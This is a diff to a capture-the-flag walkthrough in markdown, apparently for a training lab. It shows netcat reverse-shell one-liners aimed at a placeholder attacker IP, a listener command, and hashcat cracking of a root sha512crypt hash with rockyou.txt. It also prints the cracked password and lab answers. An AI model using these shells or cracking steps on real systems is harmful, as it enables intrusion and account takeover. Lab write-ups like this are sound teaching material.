@@ -118,13 +118,7 @@ we now run: `nc -nlvp 4242` on our machine, to listen for connections
 
 -v: verbose
 
-and run this command in the administrator command box: `nc -e /bin/sh YOUR_IP 4242`
-
-well. that didn't work. let's try: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4242 >/tmp/f`
-
-[Source](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-
-[Source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional)
+and run this command in the administrator command box: `nc -e /bin/sh YOUR_IP 4242` [Source](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). well... that didn't work. let's try: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4242 >/tmp/f` [Source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional)
 
 Quick Tip: Get you ip by typing in `ifconfig`. Since we have connected to a VPN, we have to look at `tun0`. run: `ifconfig tun0` and the `destination` is your IP address. 
 
@@ -169,3 +163,18 @@ After copying using: `scp /path/to/LinEnum.sh pingu@IP:/tmp`, just do `chmod +x 
 
 ### 1. What is the interesting path of the interesting suid file?
 /opt/secret/root
+
+## 10. Finishing the Job
+I'm on kali and there's the godly `rockyou.txt` 133mb file in `/usr/share/wordlists`. If you do not have it, download from [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
+
+Our attack mode is using wordlist, which we can see is labelled 0 in `hashcat --help`. Looking up out mode, we have `sha512crypt $6$, SHA512 (Unix)` at 1800. So, 
+
+run: `hashcat -m 1800 -a 0 root.txt /usr/share/wordlists/rockyou.txt`
+
+
+we get `$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish`
+
+love2fish
+
+## 11. Done
+Have fun!
